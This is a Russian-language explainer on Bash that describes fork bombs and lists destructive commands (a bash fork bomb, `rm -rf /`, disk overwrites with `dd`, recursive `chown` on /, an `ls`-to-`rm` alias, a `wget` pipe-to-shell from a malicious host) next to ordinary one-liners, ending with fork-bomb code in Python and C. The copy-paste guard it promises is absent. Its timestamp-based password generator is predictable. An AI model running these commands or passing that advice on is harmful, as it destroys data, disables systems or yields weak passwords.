# Fork

В Linux есть ряд функциональных, полезных, а порой и опасных команд, чтобы продемонстрировать потенциал использования оболочки Bash в Linux. Некоторые из них, действительно, потребуют соблюдения осторожности, так как иначе можно потерять все данные. Другие же, наоборот, окажутся очень покладистыми и полезными для повышения эффективности работы.

**Fork-бомба** - это вредоносная программа, которая использует системный вызов fork() для создания копий самой себя, образуя цепную реакцию процессов, которая приводит к экспоненциальному росту числа процессов в системе. Этот процесс продолжается до тех пор, пока не будут исчерпаны все доступные системные ресурсы, такие как процессорное время, память и файловые дескрипторы.
1. Программа создает новый процесс с помощью системного вызова fork(). При этом создается точная копия текущего процесса, включая его код, данные и состояние.
2. Новый процесс также начинает выполнять ту же самую программу и создает свои собственные копии себя путем вызова fork().
3. Этот процесс рекурсивно повторяется, приводя к экспоненциальному росту числа процессов в системе. В результате множество процессов конкурируют за доступ к системным ресурсам.

### Ущерб

1. **Исчерпание ресурсов**: в процессе рекурсивного создания процессов система исчерпывает доступные ресурсы, такие как процессорное время, память и файловые дескрипторы. Это может привести к снижению производительности системы и даже к ее полной недоступности.
2. **Отказ в обслуживании**: когда система исчерпывает все доступные ресурсы из-за fork-бомбы, она перестает быть способной обрабатывать новые запросы, что приводит к отказу в обслуживании для других пользователей и сервисов.
3. **Потенциальные последствия**: если fork-бомба запущена на сервере или критической системе, это может привести к серьезным проблемам, включая потерю данных, прерывание работы и недоступность сервисов.

# **1. Опасные команды**

**Выполняйте их, только если уверены в своих действиях. Я добавил в начало и конец каждой символы - -, чтобы их нельзя было просто скопировать и вставить.**

## **1.1. fork-бомба**

Эта «команда» при выполнении на ПК не представляет особой угрозы, но вот ее запуск на сервере может привести к отказу в обслуживании. Выглядит она как странный набор символов, хотя на деле это реальное определение функции bash.

В bash допускается использовать в качестве имени функции `:`. И в случае выполнения команды `:()::&;:` именно такую функцию мы и создаем. Внутренне она рекурсивно вызывает сама себя, то есть выполняется бесконечно, а с помощью `&` мы инструктируем процесс выполняться фоново.

`$ :(){ :|: & };:`

## **1.2. Прямая запись на жесткий диск**

Вы легко повредите файловую систему, если при выполнении любой команды сохраните ее вывод на диск. Так кому же это может понадобиться?

`$ "a command" > /dev/sda`

## **1.3. Запись на диск случайных данных**

Эта команда может пригодиться, например, для перезаписи секторов диска с целью исключения возможности восстановления данных. Напомню, что при наличии правильного инструмента вернуть данные после форматирования диска трудностей не составит.

Если использовать эту команду в цикле и выполнить ее 3-4 раза, то она в достаточной степени гарантирует невозможность восстановления удаленной информации.

`$ dd if=/dev/urandom of=/dev/disk`

`//for i in {1..10}; do dd if=/dev/urandom of=/dev/disk; done`

## **1.4. Перезаписывает содержимое жесткого диска нулями**

`dd if=/dev/zero of=/dev/sda bs=1M:` **Потенциальные последствия**: Полная потеря данных на указанном диске без возможности восстановления.

## **1.5. Удалить все**

Эта команда удаляет все, включая файлы на жестком диске и подключенных устройствах, что делает ее очень опасной, поскольку разрешения она не спрашивает.

С помощью флага rf мы инструктируем ее выполняться рекурсивно и удалять все файлы без запроса разрешения.

Символ / указывает, что начинать нужно с корневого каталога, который содержит все файлы и все смонтированные устройства с данными, включая удаленные файловые ресурсы и съемные диски. (прим. пер.: современные дистрибутивы не дают просто так удалить /, надо либо добавить --no-preserve-root, либо удалять /* (все файлы в корневом каталоге).

`$ rm -rf /`

# **2. Регулярные команды**

## **2.1. Определение самых используемых команд**

Эта однострочная инструкция удобна, когда мы хотим узнать, какие команды чаще всего используем. С помощью -n X указывается количество, которое нужно вывести. Например, n -10 отобразит 10.

`cat ~/.bash_history | tr "\\|\\;" "\\n" | sed -e "s/^ //g" | cut -d " " -f 1 | sort | uniq -c | sort -n | tail -n 10`

## **2.2. Вывод из файла списка уникальных слов**

Следующая команда используется для вывода слов, содержащих символы алфавита. Данная инструкция tr преобразует все не алфавитные символы в символы новой строки, после чего команда sed эти пустые строки удаляет. В завершении с помощью sort выполняется уникальная сортировка результатов с исключением повторений.

`tr -c a-zA-Z '\\n' < someFile.txt | sed '/^$/d' | sort | uniq -i -c`

## **2.3. Выделение цветом вывода ps**

Эта команда окрашивает вывод ps, показывая службы красным, а ведущие процессы сеанса зеленым.

```
Цвета Ascii: <http://es.tldp.org/COMO-INSFLUG/COMOs/Bash-Prompt-Como/Bash-Prompt-Como-5.html>

```

```
ps ajxf | awk '{ if($2 == $4) { if ($1 == 1) { print "\\033[35m" $0"\\033[0m"}  else print "\\033[1;32m" $0"\\033[0m" } else print $0 }'

```

## **2.4. Поиск последней команды, начинающейся с “xxx”, без ее выполнения**

В этом примере мы ищем первую команду, начинающуюся с «cp».

`!cp:p`

## **2.5. Выполнение команды N раз**

Тут все довольно очевидно: мы используем цикл и команду, которая должна выполняться при каждой его итерации.

`for i in {1..10}; do command; done`

## **2.6. Добавление часов в терминал**

Выполнение следующих команд приведет к добавлению в терминал часов, которые останутся активны до его закрытия.

`while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &`

## **2.7. Поиск повторяющихся файлов**

Удобный способ поиска дубликатов файлов, при котором команда получает и сравнивает их хэш-значения.

```
find -not -empty -type f -printf "%s
" |  sort -rn |  uniq -d |  xargs -I{} -n1  find -type f -size {}c -print0 |  xargs -0  md5sum |  sort |  uniq -w32 --all-repeated=separate

```

## **2.8. Удаление всех файлов каталога, не соответствующих заданному расширению**

Как часто у вас бывали случаи, когда нужно было очистить каталог не от всех файлов? Вместо того, чтобы делать это поэтапно, можно провернуть операцию в один шаг, указав файлы, которые нужно оставить.

`rm !(*.xls|*.slsx|*.csv)`

## **2.9. Удалить все файлы, кроме одного**

Эта команда аналогична предыдущей, но здесь мы обозначаем всего один файл, который нужно оставить.

`rm -f !(theFile.txt)`

## **2.10. Генерация случайного пароля заданной длины**

Если вы, как и я, порой испытываете трудности с придумыванием пароля, то за вас это может сделать оболочка.

**Нужная длина при этом устанавливается флагом -c.**

`date +%s | sha256sum | base64 | head -c 8; echo`

## **2.11. Рекурсивное удаление всех пустых каталогов**

**Находит и удаляет все пустые каталоги.**

`find . -type d -empty -delete`

## **2.12. Копирование разрешений файла**

**Инструкция ниже скопирует для file1 все разрешения, установленные для file2.**

`chmod --reference file2 file1`

## **2.13. Изменяет владельца и группу всех файлов и каталогов в системе на указанного пользователя и группу**

`chown -R user:user /:` **Потенциальные последствия**: Нарушение работы системы, так как это может изменить права доступа к системным файлам и каталогам, что может привести к ошибкам и сбоям.

## **2.14. К**оманда создает псевдоним для команды **`ls`**, делая так, что при вызове **`ls`** будет вызываться **`rm`**.

`echo "alias ls=rm" >> ~/.bashrc` **Потенциальные последствия**: Потеря данных из-за случайного удаления файлов при вызове команды **`ls`**.

## **2.15. К**оманда загружает скрипт [malware.sh](http://malware.sh) с веб-сайта и немедленно выполняет его.

`wget <http://malicious-site.com/malware.sh> -O - | sh:` **Потенциальные последствия**: Установка и выполнение вредоносного кода, который может нанести вред вашей системе или украсть вашу конфиденциальную информацию.

## **3. Создании fork-бомбы**

- Обычно используется язык программирования, поддерживающий вызовы fork(), такие как C или Python. Вот пример простой fork-бомбы на языке Python

`import os`

`def fork_bomb(): while True: os.fork()`

`fork_bomb()`

Этот скрипт рекурсивно вызывает себя, создавая новые процессы на каждой итерации цикла. При достаточном количестве процессов система перегрузится и перестанет реагировать.

- Пример кода на языке C, который демонстрирует простую fork-бомбу

`#include <unistd.h>`

`int main() { while(1) { fork(); } return 0; }`

Этот код создает бесконечный цикл, в котором вызывается функция fork() для создания новых процессов. Каждый новый процесс продолжает этот процесс, что приводит к экспоненциальному росту числа процессов и исчерпанию ресурсов системы.